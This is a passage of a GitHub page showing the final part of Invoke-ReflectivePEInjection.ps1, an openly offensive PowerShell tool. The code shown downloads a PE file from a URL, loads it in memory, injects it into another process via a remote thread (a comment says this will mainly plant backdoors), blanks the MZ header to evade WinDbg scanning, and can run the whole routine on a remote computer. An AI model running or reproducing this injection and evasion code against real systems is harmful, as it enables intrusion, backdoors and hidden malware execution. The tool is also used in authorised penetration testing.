          <td id="LC2858" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-MemoryProcAddress</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>FunctionName <span class="pl-s"><span class="pl-pds">&quot;</span>VoidFunc<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2859" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2859"></td>
          <td id="LC2859" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ((<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">-eq</span> <span class="pl-c1">$null</span>) <span class="pl-k">-or</span> (<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero))</td>
        </tr>
        <tr>
          <td id="L2860" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2860"></td>
          <td id="LC2860" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2861" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2861"></td>
          <td id="LC2861" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>VoidFunc couldn&#39;t be found in the DLL<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2862" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2862"></td>
          <td id="LC2862" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2863" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2863"></td>
          <td id="LC2863" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2864" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2864"></td>
          <td id="LC2864" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">=</span> Sub<span class="pl-k">-</span>SignedIntAsUnsigned <span class="pl-smi">$VoidFuncAddr</span> <span class="pl-smi">$PEHandle</span></td>
        </tr>
        <tr>
          <td id="L2865" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2865"></td>
          <td id="LC2865" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$VoidFuncAddr</span> <span class="pl-smi">$RemotePEHandle</span></td>
        </tr>
        <tr>
          <td id="L2866" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2866"></td>
          <td id="LC2866" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2867" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2867"></td>
          <td id="LC2867" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Create the remote thread, don&#39;t wait for it to return.. This will probably mainly be used to plant backdoors</span></td>
        </tr>
        <tr>
          <td id="L2868" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2868"></td>
          <td id="LC2868" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RThreadHandle</span> <span class="pl-k">=</span> Create<span class="pl-k">-</span>RemoteThread <span class="pl-k">-</span>ProcessHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L2869" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2869"></td>
          <td id="LC2869" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2870" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2870"></td>
          <td id="LC2870" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2871" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2871"></td>
          <td id="LC2871" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Don&#39;t free a library if it is injected in a remote process or if it is an EXE.</span></td>
        </tr>
        <tr>
          <td id="L2872" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2872"></td>
          <td id="LC2872" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">#</span>Note that all DLL&#39;s loaded by the EXE will remain loaded in memory.</span></td>
        </tr>
        <tr>
          <td id="L2873" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2873"></td>
          <td id="LC2873" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero <span class="pl-k">-and</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.FileType</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>DLL<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2874" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2874"></td>
          <td id="LC2874" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2875" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2875"></td>
          <td id="LC2875" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Invoke-MemoryFreeLibrary</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span></td>
        </tr>
        <tr>
          <td id="L2876" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2876"></td>
          <td id="LC2876" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2877" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2877"></td>
          <td id="LC2877" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2878" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2878"></td>
          <td id="LC2878" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2879" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2879"></td>
          <td id="LC2879" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Delete the PE file from memory.</span></td>
        </tr>
        <tr>
          <td id="L2880" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2880"></td>
          <td id="LC2880" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFree.Invoke</span></span>(<span class="pl-smi">$PEHandle</span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2881" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2881"></td>
          <td id="LC2881" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2882" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2882"></td>
          <td id="LC2882" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2883" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2883"></td>
          <td id="LC2883" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Write-Warning</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to call VirtualFree on the PE&#39;s memory. Continuing anyways.<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>WarningAction <span class="pl-k">Continue</span></td>
        </tr>
        <tr>
          <td id="L2884" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2884"></td>
          <td id="LC2884" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2885" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2885"></td>
          <td id="LC2885" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2886" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2886"></td>
          <td id="LC2886" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2887" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2887"></td>
          <td id="LC2887" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Done!<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2888" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2888"></td>
          <td id="LC2888" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2889" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2889"></td>
          <td id="LC2889" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2890" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2890"></td>
          <td id="LC2890" class="blob-code blob-code-inner js-file-line">	Main</td>
        </tr>
        <tr>
          <td id="L2891" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2891"></td>
          <td id="LC2891" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="L2892" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2892"></td>
          <td id="LC2892" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2893" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2893"></td>
          <td id="LC2893" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>Main function to either run the script locally or remotely</span></td>
        </tr>
        <tr>
          <td id="L2894" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2894"></td>
          <td id="LC2894" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Function</span> <span class="pl-en">Main</span></td>
        </tr>
        <tr>
          <td id="L2895" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2895"></td>
          <td id="LC2895" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="L2896" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2896"></td>
          <td id="LC2896" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> ((<span class="pl-c1">$PSCmdlet<span class="pl-smi">.MyInvocation.BoundParameters</span></span>[<span class="pl-s"><span class="pl-pds">&quot;</span>Debug<span class="pl-pds">&quot;</span></span>] <span class="pl-k">-ne</span> <span class="pl-c1">$null</span>) <span class="pl-k">-and</span> <span class="pl-c1">$PSCmdlet<span class="pl-smi">.MyInvocation.BoundParameters</span></span>[<span class="pl-s"><span class="pl-pds">&quot;</span>Debug<span class="pl-pds">&quot;</span></span>].IsPresent)</td>
        </tr>
        <tr>
          <td id="L2897" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2897"></td>
          <td id="LC2897" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2898" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2898"></td>
          <td id="LC2898" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">$DebugPreference</span>  <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Continue<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2899" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2899"></td>
          <td id="LC2899" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2900" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2900"></td>
          <td id="LC2900" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2901" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2901"></td>
          <td id="LC2901" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PowerShell ProcessID: <span class="pl-c1">$PID</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2902" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2902"></td>
          <td id="LC2902" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2903" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2903"></td>
          <td id="LC2903" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-c1">$PsCmdlet<span class="pl-smi">.ParameterSetName</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>LocalFile<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2904" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2904"></td>
          <td id="LC2904" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2905" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2905"></td>
          <td id="LC2905" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Get-ChildItem</span> <span class="pl-smi">$PEPath</span> <span class="pl-k">-</span>ErrorAction Stop <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2906" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2906"></td>
          <td id="LC2906" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$PEBytes</span> <span class="pl-k">=</span> [<span class="pl-k">System.IO.File</span>]::ReadAllBytes((<span class="pl-c1">Resolve-Path</span> <span class="pl-smi">$PEPath</span>))</td>
        </tr>
        <tr>
          <td id="L2907" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2907"></td>
          <td id="LC2907" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2908" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2908"></td>
          <td id="LC2908" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">elseif</span> (<span class="pl-c1">$PsCmdlet<span class="pl-smi">.ParameterSetName</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>WebFile<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2909" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2909"></td>
          <td id="LC2909" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2910" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2910"></td>
          <td id="LC2910" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$WebClient</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Net.WebClient</td>
        </tr>
        <tr>
          <td id="L2911" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2911"></td>
          <td id="LC2911" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2912" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2912"></td>
          <td id="LC2912" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$PEBytes</span> <span class="pl-k">=</span> <span class="pl-smi">$WebClient<span class="pl-smi">.DownloadData</span></span>(<span class="pl-smi">$PEUrl</span>)</td>
        </tr>
        <tr>
          <td id="L2913" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2913"></td>
          <td id="LC2913" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2914" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2914"></td>
          <td id="LC2914" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2915" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2915"></td>
          <td id="LC2915" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>Verify the image is a valid PE file</span></td>
        </tr>
        <tr>
          <td id="L2916" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2916"></td>
          <td id="LC2916" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">$e_magic</span> <span class="pl-k">=</span> (<span class="pl-smi">$PEBytes</span>[<span class="pl-c1">0</span><span class="pl-k">..</span><span class="pl-c1">1</span>] <span class="pl-k">|</span> <span class="pl-k">%</span> {[<span class="pl-k">Char</span>] <span class="pl-c1">$_</span>}) <span class="pl-k">-join</span> <span class="pl-s"><span class="pl-pds">&#39;</span><span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L2917" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2917"></td>
          <td id="LC2917" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2918" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2918"></td>
          <td id="LC2918" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-smi">$e_magic</span> <span class="pl-k">-ne</span> <span class="pl-s"><span class="pl-pds">&#39;</span>MZ<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2919" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2919"></td>
          <td id="LC2919" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="L2920" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2920"></td>
          <td id="LC2920" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&#39;</span>PE is not a valid PE file.<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L2921" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2921"></td>
          <td id="LC2921" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="L2922" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2922"></td>
          <td id="LC2922" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2923" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2923"></td>
          <td id="LC2923" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">#</span> Remove &#39;MZ&#39; from the PE file so that it cannot be detected by .imgscan in WinDbg</span></td>
        </tr>
        <tr>
          <td id="L2924" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2924"></td>
          <td id="LC2924" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span> TODO: Investigate how much of the header can be destroyed, I&#39;d imagine most of it can be.</span></td>
        </tr>
        <tr>
          <td id="L2925" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2925"></td>
          <td id="LC2925" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">$PEBytes</span>[<span class="pl-c1">0</span>] <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2926" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2926"></td>
          <td id="LC2926" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">$PEBytes</span>[<span class="pl-c1">1</span>] <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2927" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2927"></td>
          <td id="LC2927" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2928" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2928"></td>
          <td id="LC2928" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>Add a &quot;program name&quot; to exeargs, just so the string looks as normal as possible (real args start indexing at 1)</span></td>
        </tr>
        <tr>
          <td id="L2929" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2929"></td>
          <td id="LC2929" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-smi">$ExeArgs</span> <span class="pl-k">-ne</span> <span class="pl-c1">$null</span> <span class="pl-k">-and</span> <span class="pl-smi">$ExeArgs</span> <span class="pl-k">-ne</span> <span class="pl-s"><span class="pl-pds">&#39;</span><span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2930" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2930"></td>
          <td id="LC2930" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2931" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2931"></td>
          <td id="LC2931" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExeArgs</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>ReflectiveExe <span class="pl-smi">$ExeArgs</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2932" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2932"></td>
          <td id="LC2932" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2933" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2933"></td>
          <td id="LC2933" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2934" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2934"></td>
          <td id="LC2934" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2935" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2935"></td>
          <td id="LC2935" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExeArgs</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>ReflectiveExe<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2936" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2936"></td>
          <td id="LC2936" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2937" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2937"></td>
          <td id="LC2937" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2938" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2938"></td>
          <td id="LC2938" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-smi">$ComputerName</span> <span class="pl-k">-eq</span> <span class="pl-c1">$null</span> <span class="pl-k">-or</span> <span class="pl-smi">$ComputerName</span> <span class="pl-k">-imatch</span> <span class="pl-s"><span class="pl-pds">&quot;</span>^\s*$<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2939" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2939"></td>
          <td id="LC2939" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2940" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2940"></td>
          <td id="LC2940" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Invoke-Command</span> <span class="pl-k">-</span>ScriptBlock <span class="pl-smi">$RemoteScriptBlock</span> <span class="pl-k">-</span>ArgumentList <span class="pl-k">@</span>(<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span> <span class="pl-smi">$FuncReturnType</span><span class="pl-k">,</span> <span class="pl-smi">$ProcId</span><span class="pl-k">,</span> <span class="pl-smi">$ProcName</span><span class="pl-k">,</span><span class="pl-smi">$ForceASLR</span>)</td>
        </tr>
        <tr>
          <td id="L2941" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2941"></td>
          <td id="LC2941" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2942" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2942"></td>
          <td id="LC2942" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2943" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2943"></td>
          <td id="LC2943" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2944" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2944"></td>
          <td id="LC2944" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Invoke-Command</span> <span class="pl-k">-</span>ScriptBlock <span class="pl-smi">$RemoteScriptBlock</span> <span class="pl-k">-</span>ArgumentList <span class="pl-k">@</span>(<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span> <span class="pl-smi">$FuncReturnType</span><span class="pl-k">,</span> <span class="pl-smi">$ProcId</span><span class="pl-k">,</span> <span class="pl-smi">$ProcName</span><span class="pl-k">,</span><span class="pl-smi">$ForceASLR</span>) <span class="pl-k">-</span>ComputerName <span class="pl-smi">$ComputerName</span></td>
        </tr>
        <tr>
          <td id="L2945" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2945"></td>
          <td id="LC2945" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2946" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2946"></td>
          <td id="LC2946" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="L2947" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2947"></td>
          <td id="LC2947" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2948" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2948"></td>
          <td id="LC2948" class="blob-code blob-code-inner js-file-line">Main</td>
        </tr>
        <tr>
          <td id="L2949" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2949"></td>
          <td id="LC2949" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </table>
</div>

  <details class="details-reset details-overlay BlobToolbar position-absolute js-file-line-actions dropdown d-none" aria-hidden="true">
    <summary class="btn-octicon ml-0 px-2 p-0 color-bg-default border color-border-default rounded-2" aria-label="Inline file action toolbar">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
    </summary>
    <details-menu>

      <ul class="BlobToolbar-dropdown dropdown-menu dropdown-menu-se ml-2 mt-2"
      style="width:185px"
      >
        <li>
          <clipboard-copy role="menuitem" class="dropdown-item" id="js-copy-lines" style="cursor:pointer;" aria-label="Copy lines">
            Copy lines
          </clipboard-copy>
        </li>
        <li>
          <clipboard-copy role="menuitem" class="dropdown-item" id="js-copy-permalink" style="cursor:pointer;" aria-label="Copy permalink">
            Copy permalink
          </clipboard-copy>
        </li>
        <li><a class="dropdown-item js-update-url-with-hash" id="js-view-git-blame" role="menuitem" href="/clymb3r/PowerShell/blame/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">View git blame</a></li>
          <li><a class="dropdown-item" id="js-new-issue" role="menuitem" href="/clymb3r/PowerShell/issues/new">Reference in new issue</a></li>
      </ul>
    </details-menu>
  </details>

    </div>

    </div>


  

  <details class="details-reset details-overlay details-overlay-dark" id="jumpto-line-details-dialog">
    <summary data-hotkey="l" aria-label="Jump to line"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast linejump overflow-hidden" aria-label="Jump to line">
      <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-jump-to-line-form Box-body d-flex" data-turbo="false" action="" accept-charset="UTF-8" method="get">
        <input class="form-control flex-auto mr-3 linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line&hellip;" aria-label="Jump to line" autofocus>
          <button data-close-dialog="" type="submit" data-view-component="true" class="btn">    Go
</button>
</form>    </details-dialog>
  </details>



</div>

  </div>


  </div>

</turbo-frame>


    </main>
  </div>

  </div>

          <footer class="footer width-full container-xl p-responsive" role="contentinfo">
  <h2 class='sr-only'>Footer</h2>

  <div class="position-relative d-flex flex-items-center pb-2 f6 color-fg-muted border-top color-border-muted flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap mt-6 pt-6">
    <div class="list-style-none d-flex flex-wrap col-0 col-lg-2 flex-justify-start flex-lg-justify-between mb-2 mb-lg-0">
      <div class="mt-2 mt-lg-0 d-flex flex-items-center">
